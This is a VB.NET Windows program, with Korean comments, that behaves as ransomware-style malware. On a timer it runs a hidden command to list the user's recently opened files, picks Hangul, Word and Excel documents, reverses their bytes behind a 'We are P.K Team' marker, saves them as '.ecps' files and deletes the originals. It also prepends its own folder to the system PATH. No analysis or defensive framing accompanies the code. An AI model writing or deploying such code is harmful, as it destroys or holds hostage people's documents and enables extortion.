Imports System.Text
Imports System.IO
Public Class Form1
    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Timer1.Enabled = True
        SystemPathControl(Application.StartupPath)
    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs) Handles Timer1.Tick
        Try
            My.Computer.FileSystem.DeleteFile("dir.txt")
        Catch
        End Try

        Shell("cmd.exe /c dir C:\Users\" & Environment.UserName & "\AppData\Roaming\Microsoft\Windows\Recent\*.lnk /on /b /s >> dir.txt", vbHidden, True)
        Dim tmp() = IO.File.ReadAllLines("dir.txt", Encoding.Default)
        For Each tmp_tmp In tmp
            Dim cmd = CreateObject("WScript.Shell")
            Dim path = cmd.CreateShortcut(tmp_tmp).TargetPath

            Console.WriteLine(path)
            Try
                Select Case Microsoft.VisualBasic.Right(path, 4)
                    Case ".hwp"
                        fun(path)
                    Case "docx"
                        fun(path)
                    Case ".doc"
                        fun(path)
                        'Case ".txt"
                        '
                        'fun(path)
                    Case ".xls"
                        fun(path)
                    Case "xlsx"
                        fun(path)

                End Select
            Catch
            End Try
        Next
        My.Computer.FileSystem.DeleteFile("dir.txt")
        'Timer1.Enabled = False
    End Sub
    Private Sub fun(path_tmp As String)
        Try
            If Microsoft.VisualBasic.Right(path_tmp, 4).Equals("ECPS") Or Microsoft.VisualBasic.Right(path_tmp, 4).Equals("ecps") Then
                dec(path_tmp.ToString)
            Else
                enc(path_tmp.ToString)
            End If
        Catch
        End Try
    End Sub
    Public Shared Sub SystemPathControl(AppPath As String)

        Dim _sysPath As String = System.Environment.GetEnvironmentVariable("Path", EnvironmentVariableTarget.Machine)
        Dim oldPath() As String = _sysPath.Split(";")
        Dim newPath As New StringBuilder

        If Not oldPath.Contains(AppPath) Then
            newPath.Append(AppPath + ";")
            For Each ePath As String In oldPath
                newPath.Append(ePath + ";")
            Next
            System.Environment.SetEnvironmentVariable("Path", newPath.ToString, EnvironmentVariableTarget.Machine)
        End If

    End Sub
    Private Sub enc(full_name As String)
        Dim s As String = "[Content_Types].We are P.K Team "
        Dim mark_arr() As Byte = System.Text.Encoding.Default.GetBytes(s) '문자열 바이트로
        Dim file_tmp() As Byte = New Byte((File.ReadAllBytes(full_name).Length - 1)) {} '파일 바이트 배열 생성
        Array.Copy(File.ReadAllBytes(full_name), file_tmp, File.ReadAllBytes(full_name).Length) '파일 바이트 배열 받기

        Array.Reverse(file_tmp) ' 파일 바이트 재배열

        IO.File.WriteAllBytes(full_name & ".ecps", Combine(mark_arr, file_tmp))

        My.Computer.FileSystem.DeleteFile(full_name)

    End Sub
    Private Sub dec(full_name As String)

        Dim s As String = "[Content_Types].We are P.K Team "
        Dim mark_arr() As Byte = System.Text.Encoding.Default.GetBytes(s) '문자열 바이트로
        Dim file_tmp() As Byte = New Byte((File.ReadAllBytes(full_name).Length - 1)) {} '파일 바이트 배열 생성
        Array.Copy(File.ReadAllBytes(full_name), file_tmp, File.ReadAllBytes(full_name).Length) '파일 바이트 배열 받기
        Dim dec_arr() As Byte = New Byte((file_tmp.Length - mark_arr.Length - 1)) {} '파일 바이트 배열 생성
        Array.ConstrainedCopy(file_tmp, mark_arr.Length, dec_arr, 0, file_tmp.Length - mark_arr.Length)
        Array.Reverse(dec_arr) ' 파일 바이트 재배열


        IO.File.WriteAllBytes(Microsoft.VisualBasic.Left(full_name, full_name.Length - 5), dec_arr)

        My.Computer.FileSystem.DeleteFile(full_name)

    End Sub
    Private Function Combine(a As Byte(), b As Byte()) As Byte()


        Dim c As Byte() = New Byte(a.Length + (b.Length - 1)) {}

        System.Buffer.BlockCopy(a, 0, c, 0, a.Length)

        System.Buffer.BlockCopy(b, 0, c, a.Length, b.Length)

        Return c
    End Function
End Class

